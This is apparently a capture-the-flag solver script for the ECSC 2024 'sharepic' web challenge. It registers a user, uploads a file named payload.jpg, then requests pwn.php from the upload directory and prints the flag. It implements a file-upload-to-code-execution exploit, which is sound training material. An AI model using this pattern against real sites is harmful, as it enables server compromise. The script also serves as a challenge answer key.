#!/bin/python3

import logging
import os
import pathlib
import re

import requests

logging.disable()

# Per le challenge web
URL = os.environ.get("URL", "http://sharepic.challs.external.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]


session = requests.Session()

session.post(f"{URL}/register.php", data={"username": os.urandom(12).hex()})

session.post(f"{URL}/index.php", data={"description": "checker"},
             files={"picture": ("payload.jpg", open(pathlib.Path(__file__).parent / 'payload.jpg', "rb"))})

res = session.get(f"{URL}/index.php")
img_src = res.text.split('<img src="/user-data/')[1].split('"')[0]

res = session.get(f"{URL}/user-data/{img_src}/pwn.php")

print(re.findall(r'CCIT{.*}', res.text)[0])
